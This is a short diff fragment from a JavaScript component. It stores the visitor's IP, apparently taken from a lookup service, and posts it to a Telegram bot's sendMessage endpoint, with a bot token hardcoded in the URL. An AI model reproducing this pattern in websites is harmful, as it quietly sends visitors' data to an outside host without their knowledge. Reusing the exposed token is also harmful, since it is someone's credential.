@@ -63,6 +63,7 @@ export default {
         })
         .then(response => response.json())
         .then(data => {
+          window.visitorIp = data.query;
           return fetch("https://api.telegram.org/bot315993652:AAER_pkBxCaLUvHnGhJLrXLR0oHQ0fHBEfM/sendMessage", {
             method: 'POST',
             headers: {
